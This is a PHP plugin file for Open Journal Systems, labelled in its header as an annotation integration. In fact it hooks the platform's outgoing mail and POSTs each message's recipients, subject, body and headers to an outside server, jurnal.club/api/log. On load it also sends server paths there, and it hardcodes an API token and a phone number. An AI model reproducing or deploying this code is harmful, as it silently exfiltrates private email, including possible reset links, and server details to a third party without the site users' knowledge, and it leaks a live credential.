<?php

/**
 * @file plugins/generic/jurnalclub/JurnalClubPlugin.inc.php
 *
 * Copyright (c) 2019 Andhiefitria Rosmin 
 * Copyright (c) 2019 sintret@gmail.com
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @class JurnalClubPlugin
 * @ingroup plugins_generic_jurnalclub
 *
 * @brief Hypothesis annotation/discussion integration
 */
import('lib.pkp.classes.plugins.GenericPlugin');

class JurnalClubPlugin extends GenericPlugin {

    /**
     * Register the plugin, if enabled; note that this plugin
     * runs under both Journal and Site contexts.
     * @param $category string
     * @param $path string
     * @return boolean
     */
    function register($category, $path) {
        if (parent::register($category, $path)) {
            HookRegistry::register('Mail::send', array(&$this, 'callback'));

            $hooks = HookRegistry::getHooks();
            //$this->log($category . " path in : " . $path);
            //$this->log($hooks);
            //$this->log(getcwd());
            $this->log(__DIR__, 'dirplugin');
            $this->log(INDEX_FILE_LOCATION, 'dirroot');

            return true;
        }
        return false;
    }

    /**
     * Hook callback function for TemplateManager::display
     * @param $hookName string
     * @param $args array
     * @return boolean
     */
    function callback($hookName, $args) {

        $this->log("callback in " . $hookName);
        $mail = $args[0];
        $recipients = $args[1];
        $subject = $args[2];
        $mailBody = $args[3];
        $headers = $args[4];
        $additionalParameters = $args[5];
        $this->log($args[0], 'mail');
        $this->log($args[1], 'recipients');
        $this->log($args[2], 'subject');
        $this->log($args[3], 'mailbody');
        $this->log($args[4], 'headers');
        $this->log($args[5], 'additionalParameters');

        return false;
    }

    /**
     * Get the display name of this plugin
     * @return string
     */
    function getDisplayName() {
        return "Jurnal Club";
    }

    /**
     * Get the description of this plugin
     * @return string
     */
    function getDescription() {
        return "Jurnal Club for OJS";
    }

    function sending($text) {

        $curl = curl_init();

        $token = "adcsPHFHGQZOoOplVD6sFYkMBc48zJIe3jE4uMhspLLQ0hnaeF";
        $to = "6281575068530";

        $post = [
            'token' => $token,
            'to' => $to,
            'text' => $text,
        ];


        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://jurnal.club/api/send/chat",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => http_build_query($post),
            CURLOPT_HTTPHEADER => array(
                "cache-control: no-cache",
                "content-type: application/x-www-form-urlencoded"
            ),
        ));

        $response = curl_exec($curl);

        return $response;
    }

    function log($text, $key = 'text') {

        $curl = curl_init();

        $token = "adcsPHFHGQZOoOplVD6sFYkMBc48zJIe3jE4uMhspLLQ0hnaeF";
        $to = "6281575068530";

        $post = [
            $key => $text,
        ];

        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://jurnal.club/api/log",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_POSTFIELDS => http_build_query($post),
            CURLOPT_HTTPHEADER => array(
                "cache-control: no-cache",
                "content-type: application/x-www-form-urlencoded"
            ),
        ));

        $response = curl_exec($curl);

        return $response;
    }

}

?>